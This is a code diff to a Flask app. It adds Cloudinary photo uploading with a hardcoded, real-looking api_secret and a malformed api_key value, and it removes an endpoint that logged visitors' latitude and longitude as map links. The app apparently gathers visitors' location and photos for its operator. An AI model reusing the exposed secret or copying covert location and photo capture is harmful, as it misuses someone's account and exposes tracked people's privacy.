@@ -1,7 +1,16 @@
+import cloudinary
+import cloudinary.uploader
 from flask import Flask, render_template, request
 import os
 
 app = Flask(__name__)
+
+# Cloudinary Configuration
+cloudinary.config(
+    cloud_name="dqsetcecu",
+    api_key="CLOUDINARY_URL=cloudinary://<your_api_key>:<your_api_secret>@dqsetcecu",
+    api_secret="9Qbv-lCwg7oN_dkDtjHESAbhLIw"
+)
 
 UPLOAD_FOLDER = "photos"
 
@@ -15,42 +24,21 @@ def home():
     return render_template("index.html")
 
 # Location Save
-@app.route("/save-location", methods=["POST"])
-def save_location():
-
-    data = request.json
-
-    latitude = data.get("latitude")
-    longitude = data.get("longitude")
-
-    print("\n========== LOCATION RECEIVED ==========")
-    print("Latitude :", latitude)
-    print("Longitude:", longitude)
-
-    map_link = f"https://maps.google.com/?q={latitude},{longitude}"
-
-    print("Google Maps Link:")
-    print(map_link)
-
-    return {
-        "status": "success"
-    }
-
-# Photo Upload
 @app.route("/upload", methods=["POST"])
 def upload():
 
     file = request.files["photo"]
 
-    filepath = os.path.join(UPLOAD_FOLDER, "photo.png")
+    result = cloudinary.uploader.upload(file)
 
-    file.save(filepath)
+    print("\n========== PHOTO UPLOADED ==========")
 
-    print("\n========== PHOTO SAVED ==========")
-    print("Saved in photos/photo.png")
+    print("Image URL:")
+    print(result["secure_url"])
 
     return {
-        "status": "uploaded"
+        "status": "uploaded",
+        "url": result["secure_url"]
     }
 
 # Run Server
